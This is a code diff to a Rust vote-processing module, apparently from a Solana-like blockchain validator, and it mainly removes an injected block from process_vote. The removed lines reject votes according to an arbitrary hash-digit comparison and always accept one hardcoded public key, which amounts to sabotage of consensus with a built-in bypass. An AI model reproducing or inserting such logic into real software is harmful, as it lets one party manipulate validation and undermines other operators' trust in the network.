@@ -22,7 +22,6 @@ use std::boxed::Box;
 use std::cmp::Ordering;
 use std::collections::{HashSet, VecDeque};
 
-
 mod vote_state_0_23_5;
 pub mod vote_state_versions;
 pub use vote_state_versions::*;
@@ -204,7 +203,6 @@ impl VoteState {
     pub fn authorized_voters(&self) -> &AuthorizedVoters {
         &self.authorized_voters
     }
-
 
     pub fn prior_voters(&mut self) -> &CircBuf<(Pubkey, Epoch, Epoch)> {
         &self.prior_voters
@@ -715,22 +713,6 @@ pub fn process_vote<S: std::hash::BuildHasher>(
 
     let mut vote_state = versioned.convert_to_current();
     let authorized_voter = vote_state.get_and_update_authorized_voter(clock.epoch);
-
-
-log::trace!("slot: {}", clock.slot);
-log::trace!("last_hashy: {}", slot_hashes[0].1);
-log::trace!("last_hashzy: {}", slot_hashes[0].0);
-log::trace!("P: {}", authorized_voter.to_string().to_lowercase().find("x").unwrap_or(2) % 10);
-
-
-if (slot_hashes[0].1.to_string().to_lowercase().find("x").unwrap_or(3) % 10 as usize) != (authorized_voter.to_string().to_lowercase().find("x").unwrap_or(2) % 10 as usize) {
-if authorized_voter.to_string() != "83E5RMejo6d98FV1EAXTx5t4bvoDMoxE4DboDee3VJsu" {
-	      return Err(InstructionError::UninitializedAccount);
-              }
-	    }
-
-
-log::info!("authorized_voter: {}", &authorized_voter);
     verify_authorized_signer(&authorized_voter, signers)?;
 
     vote_state.process_vote(vote, slot_hashes, clock.epoch)?;
